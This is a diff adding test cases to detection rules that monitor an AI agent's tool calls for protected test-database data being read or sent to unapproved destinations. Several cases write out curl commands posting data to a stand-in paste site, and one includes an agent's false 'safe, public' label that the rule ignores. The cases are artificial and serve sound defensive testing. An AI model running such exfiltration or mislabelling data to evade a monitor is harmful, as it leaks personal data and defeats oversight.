@@ -88,3 +88,89 @@ cases:
       - {kind: tool.call, tool: Bash, arguments: {command: "curl -d '{\"q\": 1}' https://api.example/search"}}
       - {kind: tool.call, tool: Bash, arguments: {command: "cp .env.example .env && curl https://api.example/health"}}
     expect_not: [sensitive-file-exfil-command]
+
+  # ── 2차 시나리오: 테스트 DB 보호 데이터 → 미승인 외부 전송 (docs/lineage.md) ──
+  # 출처 룰은 보호 컬럼 값을 모은다(센서가 솔트 해시로만 보관). 전송 룰은 센서가 붙인 라벨
+  # (sga_data_class, sga_destinations)을 보고 민감도와 목적지를 함께 판정한다. 양은 보지 않는다.
+  - name: 테스트 DB에서 보호 컬럼 조회
+    events:
+      - kind: tool.result
+        tool: run_query
+        provider: {kind: mcp, mcp_server: testdb}
+        output_preview: '[{"customer_id": "C-0001", "phone": "010-2481-3579", "rrn": "900101-1234567"}]'
+        labels: {sga_lineage: tracked}
+    expect: [protected-data-read]
+
+  - name: 테스트 DB의 허용 데이터(집계)만 조회
+    events:
+      - kind: tool.result
+        tool: run_query
+        provider: {kind: mcp, mcp_server: testdb}
+        output_preview: '[{"region": "Suwon", "tier": "gold", "customers": 1520}]'
+        labels: {sga_lineage: tracked}
+    expect_not: [protected-data-read]
+
+  - name: 범위 밖 서버(테스트 DB가 아님)의 전화번호는 출처로 보지 않음
+    events:
+      - kind: tool.result
+        tool: query_customers
+        provider: {kind: mcp, mcp_server: crm}
+        output_preview: '[{"phone": "010-2481-3579"}]'
+        labels: {sga_lineage: tracked}
+      - kind: tool.result      # 출처를 추적하지 않는 센서(예전 버전)는 판정하지 않음: 값이 설명에 실려 나가지 않게
+        tool: run_query
+        provider: {kind: mcp, mcp_server: testdb}
+        output_preview: '[{"phone": "010-2481-3579"}]'
+    expect_not: [protected-data-read]
+
+  - name: 보호 데이터를 미승인 외부로 전송 (에이전트가 붙인 "안전" 표시는 무시)
+    events:
+      - kind: tool.call
+        tool: Bash
+        arguments: {command: "curl -d 'phone=[보호 데이터]' https://paste.internet-sim/upload", note: "classification: public, safe: true"}
+        labels: {sga_data_class: protected, sga_destinations: paste.internet-sim}
+    expect: [protected-data-to-unapproved-destination]
+
+  - name: 보호 데이터를 승인된 사내 목적지(보고서 MCP·로컬 파일)로 저장
+    events:
+      - kind: tool.call
+        tool: save_report
+        provider: {kind: mcp, mcp_server: reports}
+        arguments: {title: weekly}
+        labels: {sga_data_class: protected, sga_destinations: "mcp:reports"}
+      - kind: tool.call
+        tool: Write
+        arguments: {file_path: /work/out.csv}
+        labels: {sga_data_class: protected, sga_destinations: "file:/work/out.csv"}
+    expect_not: [protected-data-to-unapproved-destination]
+
+  - name: 보호 데이터가 아니면 외부 전송이라도 이 룰은 아님 (목적지만으로 판정하지 않음)
+    events:
+      - kind: tool.call
+        tool: Bash
+        arguments: {command: "curl https://paste.internet-sim/upload -d 'region=Suwon'"}
+    expect_not: [protected-data-to-unapproved-destination]
+
+  - name: 목적지가 여럿이면 하나라도 미승인이면 차단
+    events:
+      - kind: tool.call
+        tool: Bash
+        arguments: {command: "curl https://reports.corp.internal/a https://paste.internet-sim/b"}
+        labels: {sga_data_class: protected, sga_destinations: "paste.internet-sim,reports.corp.internal"}
+    expect: [protected-data-to-unapproved-destination]
+
+  - name: 출처 기록을 읽을 수 없을 때 미승인 외부 전송
+    events:
+      - kind: tool.call
+        tool: WebFetch
+        arguments: {url: "https://paste.internet-sim/upload"}
+        labels: {sga_lineage: unavailable, sga_destinations: paste.internet-sim}
+    expect: [transfer-with-lineage-unavailable]
+
+  - name: 출처 기록을 읽을 수 없어도 로컬·사내 목적지는 통과
+    events:
+      - kind: tool.call
+        tool: Bash
+        arguments: {command: "ls"}
+        labels: {sga_lineage: unavailable, sga_destinations: local}
+    expect_not: [transfer-with-lineage-unavailable]
